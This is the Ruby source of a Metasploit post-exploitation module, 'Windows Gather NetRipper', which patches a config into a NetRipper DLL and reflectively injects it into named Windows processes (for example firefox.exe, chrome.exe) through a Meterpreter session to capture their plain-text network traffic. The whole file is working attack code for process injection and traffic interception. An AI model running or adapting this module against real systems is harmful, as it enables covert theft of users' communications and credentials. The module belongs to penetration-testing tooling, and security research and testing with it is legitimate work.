##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/post/windows/reflective_dll_injection'
require 'rex'

class MetasploitModule < Msf::Post
  
  include Msf::Post::Windows::ReflectiveDLLInjection

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Windows Gather NetRipper Capture Network Traffic',
      'Description'   => %q{
        This module will capture plain-text network traffic of target processes
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'Ionut Popescu <ionut.popescu[at]outlook.com>' ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ],
    ))

    register_options(
    [
      OptString.new('PROCESSNAMES', [ false, 'Process names. E.g. firefox.exe,chrome.exe' ]),
      OptString.new('PROCESSIDS',   [ false, 'Process IDs. E.g. 1244,1256' ]),
      OptString.new('DLLPATH',      [ false, 'Where to find NetRipper DLLs. Default is /usr/share/metasploit-framework...' ]),
      OptString.new('DATAPATH',     [ false, 'Where to save files. E.g. C:\\Windows\\Temp or TEMP', 'TEMP' ]),
      OptString.new('PLAINTEXT',    [ false, 'True to save only plain-text data',                   'false' ]),
      OptString.new('DATALIMIT',    [ false, 'The number of bytes to save from requests/responses', '65535' ]),
      OptString.new('STRINGFINDER', [ false, 'Search for specific strings in captured data',        'DEFAULT' ])
    ], self.class)
  end
  
  # Generate configuration XML
  
  def generate_configuration(datapath, plaintext, datalimit, stringfinder)
  
	confdata = "<NetRipper>"
	
	# Plaintext 
	
	confdata = confdata + "<plaintext>"
	confdata = confdata + plaintext
	confdata = confdata + "</plaintext>"
	
	# Datalimit
	
	confdata = confdata + "<datalimit>"
	confdata = confdata + datalimit
	confdata = confdata + "</datalimit>"
	
	# Stringfinder
	
	confdata = confdata + "<stringfinder>"
	confdata = confdata + stringfinder
	confdata = confdata + "</stringfinder>"
	
	# Datapath
	
	confdata = confdata + "<data_path>"
	confdata = confdata + datapath
	confdata = confdata + "</data_path>"
	
	# Final
	
	confdata = confdata + "</NetRipper>"
	
	# Add padding
	
	confdata = confdata.ljust(1000, '?')
	
	return confdata
  
  end
  
  # Configure DLL -> Write it to /tmp and return the location
  
  def configure_dll(dllfullpath, configdata)
  
	new_dll = "/tmp/NetRipper.dll"
	dll_file = File.open(dllfullpath, "rb")

	file_contents = dll_file.read
	file_size     = dll_file.size
	dll_file.close

	# Parse file

	bFound = true
	searchString = "<NetRipper>"

	for i in 0..file_size - 12

		bFound = true
	
		# Try to find the string
		
		for j in i..i+10
	
			if file_contents[j] != searchString[j - i]
				bFound = false
			end
	
		end
		
		# We found the string marker
	
		if bFound 
			
			# Write first part
			
			new_dll_file = File.open(new_dll, "wb")
			
			for a in 0..i-1
				new_dll_file.write(file_contents[a])
			end
			
			# Write configuration
			
			new_dll_file.write(configdata)
			
			# Write the second part
			
			newpos = i+1000
			
			for b in newpos..file_size-1
				new_dll_file.write(file_contents[b])
			end
			
			new_dll_file.close
			
		end

	end
	
	return new_dll
  
  end
  
  # Function to get the x86 or x64 DLL filename for specified process ID
  
  def get_dll_for_process(process_id, dllpath)
  
	dllfile = ""
  
	# Check if the system is 32 bits or 64 bits
    
    if sysinfo['Architecture'] =~ /x64/
    
		open_process = client.sys.process.open(process_id, PROCESS_ALL_ACCESS)
		apicall = session.railgun.kernel32.IsWow64Process(open_process.handle, 4)["Wow64Process"]
      
		# railgun returns '\x00\x00\x00\x00' if the process is 64 bits.
		
		if apicall == "\x00\x00\x00\x00"
			dllfile = dllpath + "DLL.x64.dll"
		else
			dllfile = dllpath + "DLL.x86.dll"
		end
		
	# System is 32 bits
	
    else
		dllfile = dllpath + "DLL.x86.dll"
    end
    
    return dllfile
  
  end
  
  # Inject in process 
  
  def inject_in_process(processdata, dllpath)
  
	print_status("Trying to inject in #{processdata['name']} - #{processdata['pid']}")
	      
	begin
	
		# Reflective DLL injection

		host_process = client.sys.process.open(processdata['pid'], PROCESS_ALL_ACCESS)
		dll_mem, offset = inject_dll_into_process(host_process, dllpath)
		host_process.thread.create(dll_mem + offset, 0)
		
		print_good("Successfully injected in #{processdata['name']} - #{processdata['pid']}")
	   
		# On error
	   
	rescue Rex::Post::Meterpreter::RequestError

		print_error("Cannot inject in #{processdata['name']} - #{processdata['pid']}")
	      
	end
  
  end

  # Main method

  def run
  
    processnames	 = datastore['PROCESSNAMES']
    processids		 = datastore['PROCESSIDS']
    dllpath   		 = datastore['DLLPATH']
    datapath		 = datastore['DATAPATH']
    plaintext		 = datastore['PLAINTEXT']
    datalimit		 = datastore['DATALIMIT']
    stringfinder	 = datastore['STRINGFINDER']
    
    # Where to find the DLL files
    
    if dllpath.nil?
		dllpath = "/usr/share/metasploit-framework/modules/post/windows/gather/netripper/"
	else
		dllpath = dllpath + "/"
    end
    
    # We must have a process specified for injection
    
    if processnames.nil? && processids.nil?
    
		print_error("Module failed! Is is required to speficy target PROCESSNAMES or PROCESSIDS\n")
		return
    
    end
      
	# Inject in specified processes
	
	session.sys.process.get_processes().each do |x|
	
		# Inject by process names
	
		if processnames.nil? == false
	
			processes = processnames.split(',')

			processes.each do |process_name|
	    
				if process_name.downcase == x['name'].downcase
	      
					# Inject
				
					dllforprocess = get_dll_for_process(x['pid'], dllpath)
					configdata    = generate_configuration(datapath, plaintext, datalimit, stringfinder)
					configureddll = configure_dll(dllforprocess, configdata)
					
					inject_in_process(x, configureddll)
	      
				end
				
			end
	
		end
		
		# Inject process IDs
		
		if processids.nil? == false
	
			processes = processids.split(',')

			processes.each do |process_id|
	    
				if process_id == x['pid']
	      
					# Inject
					
					dllforprocess = get_dll_for_process(x['pid'], dllpath)
					configdata    = generate_configuration(datapath, plaintext, datalimit, stringfinder)
					configureddll = configure_dll(dllforprocess, configdata)
					
					inject_in_process(x, configureddll)
	      
				end
				
			end
	
		end
   
	end

  end
  
end
